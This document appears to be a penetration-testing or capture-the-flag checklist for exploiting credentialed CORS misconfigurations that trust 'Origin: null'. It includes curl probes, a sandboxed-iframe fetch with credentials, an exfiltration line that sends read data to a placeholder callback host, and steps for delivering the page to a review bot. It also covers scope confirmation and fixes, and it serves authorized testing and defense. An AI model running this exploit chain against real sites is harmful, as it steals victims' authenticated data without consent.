# CORS Null-Origin Recon Checklist

## Goal

Find credentialed CORS misconfigurations that trust `Origin: null`, confirm sandbox exploitability, and extract the minimum proof through a review/admin bot if needed.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host and date.
- Do not copy live flags, cookies, tokens, or private callback URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
```

## 2. Map Authenticated Surface

From frontend JS, traffic, and path probing, list endpoints that:

- require session cookies
- return JSON or sensitive files
- are fetched with `credentials:'include'`

Common examples:

```text
/api/me
/api/profile
/api/user
/poster.svg
/api/secret
```

Record:

```text
Endpoint:
Auth required:
Response type:
Frontend fetch usage:
```

## 3. Probe CORS Behavior

For each candidate endpoint, send:

```bash
curl -sI -H "Origin: null" "https://[host]/[endpoint]"
curl -sI -H "Origin: https://[host]" "https://[host]/[endpoint]"
curl -sI -H "Origin: https://evil.example" "https://[host]/[endpoint]"
```

Also test preflight when needed:

```bash
curl -sI -X OPTIONS "https://[host]/[endpoint]" \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: GET"
```

Record:

```text
Origin tested:
Access-Control-Allow-Origin:
Access-Control-Allow-Credentials:
Vary: Origin present?
```

## 4. Classify Misconfiguration

High priority:

```text
Origin: null -> ACAO: null + ACAC: true
```

Lower priority / usually not enough alone:

```text
Reflects only same-site origin
Wildcard with credentials (browser blocks read anyway)
ACAO present without credentials on public data
```

If only exact origin reflection works, this checklist is less relevant; test normal origin reflection chains separately.

## 5. Locate The Secret

Do not assume `/api/me` contains the flag.

Check for:

```text
protected SVG/image routes
/admin or /secret APIs
background assets loaded only after login
embedded text in returned markup
```

Quick authenticated check:

```bash
curl -s -b "session=$SESSION" "https://[host]/poster.svg" | head
curl -s -b "session=$SESSION" "https://[host]/api/me"
```

## 6. Find Victim Delivery Path

Search UI and JS for:

```text
review
report
curator
send
visit
bot
```

Record:

```text
Trigger endpoint:
Required auth:
Accepted URL scheme/host:
```

## 7. Build Sandbox Exploit

Use null-origin primitive:

```html
<iframe sandbox="allow-scripts" srcdoc="..."></iframe>
```

Inside `srcdoc`:

```javascript
fetch('https://[host]/[endpoint]', {credentials:'include'})
```

Exfil with:

```javascript
(new Image()).src = 'https://[callback]/?' + encodeURIComponent(data)
```

## 8. Trigger And Poll

1. Host exploit externally.
2. Submit URL to review/report endpoint.
3. Poll OAST or callback logs.

Expected:

```text
authenticated JSON from victim
protected file body
admin username/role confirmation
```

## 9. Result Interpretation

Confirmed when:

- `Origin: null` is reflected with credentials on sensitive routes
- sandboxed attacker page can read authenticated response content
- review bot visit produces callback proof from victim session

Likely but unconfirmed when:

- CORS headers look vulnerable but no bot/callback proof yet
- only low-value JSON is exposed

False positive when:

- endpoint is public and contains no secret
- CORS headers appear in error responses but browser still blocks read
- attacker tests their own session instead of victim browser

## 10. Fix Guidance

- Reject `Origin: null` on credentialed endpoints.
- Use strict origin allowlists.
- Remove secrets from CORS-enabled authenticated file routes.
- Isolate review-bot sessions from privileged data.

## Related Files

- `notes/cors-null-origin-credentials-sandbox-bypass.md`
- `payloads/cors/sandbox-null-origin-credentialed-fetch-exfil.md`
- `notes/postmessage-window-origin-null-bypass.md`
